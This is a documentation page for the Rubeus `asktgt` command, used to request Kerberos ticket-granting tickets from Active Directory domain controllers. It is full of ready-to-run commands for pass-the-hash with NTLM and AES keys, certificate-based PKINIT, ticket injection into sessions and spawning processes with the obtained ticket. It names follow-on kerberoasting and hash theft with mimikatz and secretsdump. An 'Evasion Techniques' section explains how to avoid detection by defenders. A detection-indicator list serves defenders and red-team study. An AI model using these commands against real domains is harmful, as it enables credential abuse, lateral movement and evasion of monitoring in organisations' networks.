## Overview

Request Ticket Granting Tickets (TGTs) from the domain controller using various authentication methods. The `asktgt` command is the foundation of most Kerberos operations and supports multiple authentication mechanisms for maximum flexibility.

```mermaid
sequenceDiagram
    participant Client as 👤 Client<br/>(User/Attacker)
    participant KDC as 🏛️ Key Distribution Center<br/>(Domain Controller)
    participant Service as 🖥️ Target Service<br/>(File Server, SQL, etc.)

    Client->>+KDC: 1. AS-REQ: Request TGT<br/>📋 Rubeus: asktgt /user:alice /password:pass
    Note right of Client: Authentication Methods:<br/>• Password: /password:pass<br/>• Hash: /rc4:hash<br/>• Certificate: /certificate:cert.pfx

    KDC-->>Client: 2. AS-REP: TGT + Session Key<br/>✅ Encrypted with user's key
```



<CardGroup cols={3}>
  <Card title="Password Auth" icon="key">
    Use plaintext passwords for standard authentication
  </Card>
  <Card title="Hash Auth" icon="hashtag">
    Pass-the-hash with NTLM, AES128, or AES256 hashes
  </Card>
  <Card title="Certificate Auth" icon="certificate">
    PKINIT authentication with X.509 certificates
  </Card>
</CardGroup>

## Syntax

<CodeGroup>
```bash Password Authentication
Rubeus.exe asktgt /user:USER /password:PASSWORD [options]
```

```bash Hash Authentication
Rubeus.exe asktgt /user:USER /rc4:NTLM_HASH [options]
```

```bash Certificate Authentication
Rubeus.exe asktgt /user:USER /certificate:cert.pfx [options]
```

```bash Advanced Options
Rubeus.exe asktgt /user:USER /password:PASSWORD /domain:DOMAIN /dc:DC01 /outfile:ticket.kirbi /ptt /opsec
```
</CodeGroup>

## Authentication Methods

<Tabs>
  <Tab title="Password Authentication">
    <ParamField path="password" type="string" required>
      Plaintext password for the target user
    </ParamField>

    <ParamField path="enctype" type="string">
      Encryption type for authentication
      <Expandable title="Supported Types">
        - `DES` - Legacy DES encryption (deprecated)
        - `RC4` - RC4-HMAC encryption
        - `AES128` - AES128-CTS-HMAC-SHA1-96
        - `AES256` - AES256-CTS-HMAC-SHA1-96 (recommended)
      </Expandable>
    </ParamField>

    <CodeGroup>
    ```bash Basic Password Auth
    Rubeus.exe asktgt /user:admin /password:Password123!
    ```

    ```bash With Encryption Type
    Rubeus.exe asktgt /user:admin /password:Password123! /enctype:AES256
    ```

    ```bash Cross-Domain Request
    Rubeus.exe asktgt /user:admin /password:Password123! /domain:child.corp.local
    ```
    </CodeGroup>

    <Note>
      Password authentication generates the most legitimate-looking authentication events but requires knowledge of the plaintext password.
    </Note>
  </Tab>

  <Tab title="Hash Authentication">
    Use password hashes for pass-the-hash attacks without knowing the plaintext password.

    <ParamField path="des" type="string">
      DES hash for legacy systems
    </ParamField>

    <ParamField path="rc4" type="string">
      RC4/NTLM hash (most commonly used)
    </ParamField>

    <ParamField path="aes128" type="string">
      AES128 key for stronger encryption
    </ParamField>

    <ParamField path="aes256" type="string">
      AES256 key for strongest encryption
    </ParamField>

    <CodeGroup>
    ```bash NTLM Hash
    Rubeus.exe asktgt /user:admin /rc4:32ed87bdb5fdc5e9cba88547376818d4
    ```

    ```bash AES256 Hash
    Rubeus.exe asktgt /user:admin /aes256:7b3e90a8...2f5c8d1a
    ```

    ```bash Multiple Hash Types
    # Try AES256 first, fallback to RC4
    Rubeus.exe asktgt /user:admin /aes256:7b3e90a8... /rc4:32ed87bd...
    ```
    </CodeGroup>

    <Warning>
      Hash authentication may appear suspicious in environments that enforce AES encryption and monitor for RC4 usage.
    </Warning>
  </Tab>

  <Tab title="Certificate Authentication">
    Use X.509 certificates for PKINIT authentication, supporting both file-based and smartcard certificates.

    <ParamField path="certificate" type="string" required>
      Certificate path, thumbprint, or subject name
      <Expandable title="Certificate Formats">
        - **File Path**: `/certificate:C:\temp\cert.pfx`
        - **Base64**: `/certificate:MIIR3QIB...(snip)...QI/GZmyPRFEeE=`
        - **Thumbprint**: `/certificate:f063e6f4798af085946be6cd9d82ba39`
        - **Subject**: `/certificate:"CN=User,OU=IT,DC=corp,DC=local"`
      </Expandable>
    </ParamField>

    <ParamField path="password" type="string">
      Password for encrypted certificate files (PFX/P12)
    </ParamField>

    <CodeGroup>
    ```bash PFX Certificate
    Rubeus.exe asktgt /user:admin /certificate:C:\temp\admin.pfx /password:certpass
    ```

    ```bash PFX Certificate Base64
    Rubeus.exe asktgt /user:admin /certificate:MIIR3QIB...(snip)...QI/GZmyPRFEeE= /password:certpass
    ```

    ```bash Smartcard Certificate
    Rubeus.exe asktgt /user:admin /certificate:f063e6f4798af085946be6cd9d82ba39
    ```

    ```bash Certificate Subject
    Rubeus.exe asktgt /user:admin /certificate:"CN=Admin User,OU=IT,DC=corp,DC=local"
    ```
    </CodeGroup>

    <Info>
      Certificate authentication is often the most stealthy method as it uses legitimate PKI infrastructure and generates standard authentication logs.
    </Info>
  </Tab>
</Tabs>

## Required Parameters

<ParamField path="user" type="string" required>
  Target username for TGT request
  <Expandable title="Username Formats">
    - Simple username: `admin`
    - UPN format: `admin@corp.local`
    - Down-level format: `CORP\admin`
  </Expandable>
</ParamField>

## Optional Parameters

<Expandable title="Domain and Infrastructure" icon="network-wired">
  <ParamField path="domain" type="string">
    Target domain (default: current domain)
  </ParamField>

  <ParamField path="dc" type="string">
    Specific domain controller to target
  </ParamField>

  <ParamField path="proxyurl" type="string">
    KDC proxy URL for authentication
    <Tooltip tip="Useful for remote environments or when direct DC access is restricted">
      Format: `https://KDC_PROXY/kdcproxy`
    </Tooltip>
  </ParamField>
</Expandable>

<Expandable title="Output Options" icon="file-export">
  <ParamField path="outfile" type="string">
    Save TGT to file in .kirbi format
  </ParamField>

  <ParamField path="nowrap" type="boolean">
    Don't wrap base64 output at 64 characters
  </ParamField>

  <ParamField path="ptt" type="boolean">
    Pass-the-ticket: inject TGT into current session
    <Tooltip tip="Automatically applies the requested TGT to your current logon session">
      Equivalent to running `ptt` command after TGT acquisition
    </Tooltip>
  </ParamField>
</Expandable>

<Expandable title="Advanced Options" icon="cog">
  <ParamField path="luid" type="string">
    Target specific logon session ID (requires elevation)
  </ParamField>

  <ParamField path="opsec" type="boolean">
    Use OPSEC-safe options to reduce detection
    <Tooltip tip="Forces AES encryption and implements evasion techniques">
      Recommended for stealth operations
    </Tooltip>
  </ParamField>

  <ParamField path="nopac" type="boolean">
    Don't request a PAC (Privilege Attribute Certificate)
  </ParamField>

  <ParamField path="suppenctype" type="string">
    Supported encryption types to advertise
  </ParamField>
</Expandable>

<Expandable title="Special Modes" icon="magic-wand-sparkles">
  <ParamField path="createnetonly" type="string">
    Create new process with network-only credentials
    <Tooltip tip="Spawns a new process (e.g., cmd.exe) with the TGT applied">
      Example: `/createnetonly:C:\Windows\System32\cmd.exe`
    </Tooltip>
  </ParamField>

  <ParamField path="show" type="boolean">
    Show the created process window (use with createnetonly)
  </ParamField>

  <ParamField path="changepw" type="boolean">
    Request TGT for password change operations
  </ParamField>

  <ParamField path="getcredentials" type="boolean">
    Retrieve credentials from PKINIT response
  </ParamField>
</Expandable>

## Response Format

<Tabs>
  <Tab title="Successful Response">
    ```bash
    [*] Action: Ask TGT

    [*] Using rc4_hmac hash: 32ed87bdb5fdc5e9cba88547376818d4
    [*] Building AS-REQ (w/ preauth) for: 'corp.local\admin'
    [*] Using domain controller: dc01.corp.local (192.168.1.10)
    [*] Sending AS-REQ to dc01.corp.local:88
    [*] Received AS-REP
    [*] Ticket expires: 10/25/2024 11:23:45 PM
    [*] Service ticket expires: 11/1/2024 1:23:45 PM
    [*] Base64(ticket.kirbi):

          doIFujCCBbagAwIBBaEDAgEWooIEujCCBLahggS2MIIEsqADAgEFoQwbCkNPUlAuTE9D
          QUyhHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCmNvcnAubG9jYWyjggR9MIIEeaADAgESoQMC
          AQKiggRrBIIEZ2P+9l3v9...
    ```

    <ResponseField name="Action" type="string">
      Command being executed (`Ask TGT`)
    </ResponseField>

    <ResponseField name="Authentication Method" type="string">
      Hash type used for authentication
    </ResponseField>

    <ResponseField name="Domain Controller" type="string">
      Target DC and IP address used
    </ResponseField>

    <ResponseField name="Ticket Expiration" type="datetime">
      When the TGT expires
    </ResponseField>

    <ResponseField name="Service Ticket Expiration" type="datetime">
      When service tickets expire
    </ResponseField>

    <ResponseField name="Base64 Ticket" type="string">
      TGT in base64 format for use with other commands
    </ResponseField>
  </Tab>

  <Tab title="Error Response">
    ```bash
    [!] Unhandled Rubeus exception:

    System.ComponentModel.Win32Exception: The network path was not found
       at Rubeus.Networking.SendBytes(String server, Int32 port, Byte[] data)
       at Rubeus.Ask.TGT(String userName, String domain, String password)
    ```

    <Warning>
      Common error scenarios and troubleshooting:
      - **Network path not found**: DC unreachable or DNS issues
      - **Clock skew detected**: Time synchronization issues
      - **Preauthentication failed**: Invalid credentials
      - **Principal unknown**: User doesn't exist in domain
    </Warning>
  </Tab>
</Tabs>

## Examples

<Tabs>
  <Tab title="Basic Operations">
    <CodeGroup>
    ```bash Standard Authentication
    # Basic password authentication
    Rubeus.exe asktgt /user:admin /password:Password123!

    # Hash-based authentication
    Rubeus.exe asktgt /user:admin /rc4:32ed87bdb5fdc5e9cba88547376818d4

    # Certificate authentication
    Rubeus.exe asktgt /user:admin /certificate:admin.pfx /password:certpass
    ```

    ```bash With Output Options
    # Save TGT to file
    Rubeus.exe asktgt /user:admin /password:Password123! /outfile:admin.kirbi

    # Apply TGT immediately
    Rubeus.exe asktgt /user:admin /rc4:hash /ptt

    # Both save and apply
    Rubeus.exe asktgt /user:admin /password:Password123! /outfile:admin.kirbi /ptt
    ```
    </CodeGroup>
  </Tab>

  <Tab title="Advanced Usage">
    <CodeGroup>
    ```bash OPSEC-Safe Operations
    # Use AES encryption and evasion techniques
    Rubeus.exe asktgt /user:admin /password:Password123! /opsec

    # Specific encryption type
    Rubeus.exe asktgt /user:admin /password:Password123! /enctype:AES256

    # Target specific domain controller
    Rubeus.exe asktgt /user:admin /password:Password123! /dc:dc01.corp.local
    ```

    ```bash Cross-Domain Operations
    # Target child domain
    Rubeus.exe asktgt /user:admin /password:Password123! /domain:child.corp.local

    # Use KDC proxy
    Rubeus.exe asktgt /user:admin /password:Password123! /proxyurl:https://proxy.corp.local/kdcproxy
    ```
    </CodeGroup>
  </Tab>

  <Tab title="Process Creation">
    <CodeGroup>
    ```bash Network-Only Process
    # Create cmd.exe with TGT applied
    Rubeus.exe asktgt /user:admin /password:Password123! /createnetonly:C:\Windows\System32\cmd.exe

    # Create PowerShell with TGT
    Rubeus.exe asktgt /user:admin /rc4:hash /createnetonly:powershell.exe /show

    # Create process in specific domain
    Rubeus.exe asktgt /user:admin /password:Password123! /domain:corp.local /createnetonly:cmd.exe
    ```
    </CodeGroup>
  </Tab>

  <Tab title="Special Scenarios">
    <CodeGroup>
    ```bash Password Change TGT
    # TGT for password change (expired password)
    Rubeus.exe asktgt /user:admin /password:ExpiredPass123! /changepw

    # TGT without PAC
    Rubeus.exe asktgt /user:admin /password:Password123! /nopac
    ```

    ```bash Certificate Scenarios
    # Smartcard authentication
    Rubeus.exe asktgt /user:admin /certificate:f063e6f4798af085946be6cd9d82ba39

    # Get credentials from PKINIT
    Rubeus.exe asktgt /user:admin /certificate:admin.pfx /getcredentials
    ```
    </CodeGroup>
  </Tab>
</Tabs>

## Integration Workflows

<Steps>
  <Step title="Credential Preparation">
    Obtain the necessary credentials for TGT request:

    ```bash
    # Generate hashes if you have passwords
    Rubeus.exe hash /password:Password123! /user:admin /domain:corp.local

    # Or use extracted hashes from other tools
    # mimikatz, secretsdump, etc.
    ```
  </Step>

  <Step title="TGT Request">
    Request the initial TGT using your chosen authentication method:

    ```bash
    # Choose based on available credentials
    Rubeus.exe asktgt /user:admin /rc4:hash /outfile:admin.kirbi /ptt
    ```
  </Step>

  <Step title="Verification">
    Verify the TGT was successfully obtained and applied:

    ```bash
    # List current tickets
    Rubeus.exe klist

    # Describe the TGT
    Rubeus.exe describe /ticket:admin.kirbi
    ```
  </Step>

  <Step title="Follow-up Operations">
    Use the TGT for subsequent operations:

    ```bash
    # Request service tickets
    Rubeus.exe asktgs /service:cifs/fileserver.corp.local

    # Perform kerberoasting
    Rubeus.exe kerberoast
    ```
  </Step>
</Steps>

## OPSEC Considerations

<Warning>
**Detection Vectors**: TGT requests generate authentication logs and network traffic that can be monitored by defenders.
</Warning>

<Tabs>
  <Tab title="Detection Risks">
    <Expandable title="Authentication Logs" defaultOpen>
      - **Event 4768**: TGT request events in domain controller logs
      - **Event 4771**: Pre-authentication failure logs (for invalid credentials)
      - **Event 4769**: Service ticket request events (follow-up operations)
    </Expandable>

    <Expandable title="Network Indicators">
      - Raw Kerberos traffic on port 88
      - Unusual authentication patterns (timing, frequency)
      - Encryption downgrade indicators (RC4 in AES environments)
    </Expandable>

    <Expandable title="Host-Based Indicators">
      - Non-standard processes issuing Kerberos requests
      - Unusual API usage patterns
      - Memory access to LSASS (for ticket injection)
    </Expandable>
  </Tab>

  <Tab title="Evasion Techniques">
    <Expandable title="Blend with Normal Traffic" defaultOpen>
      ```bash
      # Use AES encryption to match modern environments
      Rubeus.exe asktgt /user:admin /password:Password123! /enctype:AES256

      # Use OPSEC flag for additional protections
      Rubeus.exe asktgt /user:admin /password:Password123! /opsec
      ```
    </Expandable>

    <Expandable title="Timing Considerations">
      - Perform operations during business hours
      - Implement delays between requests
      - Match normal authentication patterns
      - Avoid bulk or automated patterns
    </Expandable>

    <Expandable title="Technical Evasion">
      ```bash
      # Use legitimate certificates when possible
      Rubeus.exe asktgt /user:admin /certificate:legitimate.pfx

      # Target specific DCs to avoid load balancers
      Rubeus.exe asktgt /user:admin /password:Password123! /dc:dc01.corp.local
      ```
    </Expandable>
  </Tab>
</Tabs>

## Troubleshooting

<Expandable title="Common Issues" icon="exclamation-triangle">
  <Tabs>
    <Tab title="Authentication Failures">
      **Symptoms**: Pre-authentication failed errors

      **Solutions**:
      - Verify credentials are correct
      - Check account status (not locked/disabled)
      - Confirm domain name and user format
      - Test with different encryption types

      ```bash
      # Try different credential formats
      Rubeus.exe asktgt /user:CORP\admin /password:Password123!
      Rubeus.exe asktgt /user:admin@corp.local /password:Password123!
      ```
    </Tab>

    <Tab title="Network Issues">
      **Symptoms**: Network path not found, timeouts

      **Solutions**:
      - Check DNS resolution for domain controllers
      - Verify firewall rules allow port 88
      - Test connectivity to specific DCs
      - Consider using KDC proxy

      ```bash
      # Test specific DC
      Rubeus.exe asktgt /user:admin /password:Password123! /dc:192.168.1.10

      # Use KDC proxy
      Rubeus.exe asktgt /user:admin /password:Password123! /proxyurl:https://proxy.corp.local/kdcproxy
      ```
    </Tab>

    <Tab title="Clock Skew">
      **Symptoms**: Clock skew detected errors

      **Solutions**:
      - Synchronize system time with domain
      - Check time zone settings
      - Verify NTP configuration

      ```bash
      # Check time synchronization
      w32tm /query /status

      # Sync with domain
      w32tm /resync
      ```
    </Tab>
  </Tabs>
</Expandable>

## Related Commands

<CardGroup cols={2}>
  <Card title="asktgs" icon="ticket" href="/ghostpack-docs/Rubeus-mdx/commands/ticket-requests/asktgs">
    Request service tickets using the obtained TGT
  </Card>
  <Card title="ptt" icon="arrow-right" href="/ghostpack-docs/Rubeus-mdx/commands/management/ptt">
    Inject TGT into logon session manually
  </Card>
  <Card title="describe" icon="magnifying-glass" href="/ghostpack-docs/Rubeus-mdx/commands/management/describe">
    Analyze TGT structure and contents
  </Card>
  <Card title="hash" icon="hashtag" href="/ghostpack-docs/Rubeus-mdx/commands/miscellaneous/hash">
    Generate hashes from passwords for authentication
  </Card>
</CardGroup>